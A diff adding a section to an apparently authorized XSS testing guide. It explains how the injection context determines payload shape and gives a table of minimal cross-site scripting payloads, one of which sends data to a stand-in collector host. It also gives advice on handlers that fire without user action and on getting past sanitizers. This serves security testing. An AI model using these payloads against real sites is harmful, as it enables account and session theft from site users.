@@ -48,6 +48,39 @@ Record where the marker lands:
 
 Do not choose payloads before context classification.
 
+## Why context selects the payload
+
+The browser is already parsing; the only question is **what you must escape to
+reach a position where script can run.** Context answers that, so the payload
+follows from it rather than from a list.
+
+| Context | What must be escaped first | Minimal shape |
+|---|---|---|
+| HTML text/body | nothing; introduce a tag | `<img src onerror=X>`, `<svg onload=X>` |
+| quoted attribute | the quote, then add a handler | `" autofocus onfocus=X "` |
+| unquoted attribute | nothing; whitespace starts a new attribute | ` autofocus onfocus=X ` |
+| URL-bearing attribute | nothing; the scheme is the sink | `javascript:X`, `data:text/html,X` |
+| inline JavaScript string | the string delimiter, then a statement | `';X;//` |
+| JSON/bootstrap blob | the string, then the script element | `</script><svg onload=X>` |
+| template literal | nothing; `${}` evaluates in place | `${X}` |
+| CSS/style | the property, then a URL-accepting sink | `;background-image:url(//collector/?X)` |
+| escaped response the client later decodes | nothing in the HTTP response; the client's decode restores it | encode so the server escaper passes it and the client decode undoes it |
+
+Two derivation rules do most of the work:
+
+- **Handler choice is about interaction.** `onerror` on a broken `src` and
+  `autofocus onfocus` both fire without a victim action; `onclick` and
+  `onmouseover` need one, which may be fine for a stored admin view and useless
+  for a one-shot link. Pick by what the delivery path can assume.
+- **An element you do not need is cheaper than one you do.** `svg`/`img` with an
+  event attribute survives many sanitizers that strip `script`, because the
+  sanitizer models tags while the browser models the parse.
+
+If a shape is blocked, the next question is **where the filter sits relative to
+the browser's parse** — before it, and encoding may pass; after it, change the
+element or handler rather than the encoding. That is the same defense-thesis
+step `injection-testing-policy` requires, applied here.
+
 ## Testing Loop
 
 1. Send a marker with a unique token.
